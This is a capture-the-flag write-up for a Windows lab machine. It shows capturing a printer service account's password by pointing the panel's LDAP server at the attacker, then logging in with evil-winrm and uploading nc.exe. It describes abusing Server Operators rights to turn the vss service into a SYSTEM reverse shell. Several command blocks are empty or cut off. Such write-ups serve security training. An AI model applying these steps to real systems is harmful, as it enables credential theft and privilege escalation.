## Summary
This box is an easy windows machine that focuses on using a user that is part of the Server Operators group to start a service giving us a reverse shell as `nt authority\system`

## Foothold
We start out by doing an nmap port scan 

```console

```
The server has a bunch of ports open. Let's start by checking out the web application hosted on port 80, since it seems like an admin panel for a printer.

If we access the settings tab we can change the address of the server to our own IP address. We can then setup a listener on port 389. This is just so we can see what is going on when the machine tries to connect to us.

It seems that when the printer attempted to connect to our machine it gave us its name and password. Neat. We can use these credentials to login via evil-winrm.

```console
┌──(bitis㉿workstation)-[~/htb/Machines/return]
└─$ evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'                                                                                                                                                                      1 ⨯

## Privilege escalation
Now that we have access to the system we should check out what kind of privileges our user has. 

```console
Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer

```
Our user is part of the `Server Operators` group, which can stop and start services on the system. We can add our own little service, start it and then elevate our privileges.

```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /home/bitis/htb/Machines/return/nc.exe
Info: Uploading /home/bitis/htb/Machines/return/nc.exe to C:\Users\svc-printer\Documents\nc.exe

[SC] StartService FAILED 1053:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 

```
We successfully changed the vss service to create a reverse shell on port 4444 before restarting it

```console
┌──(bitis㉿workstation)-[~/htb/Machines/return]
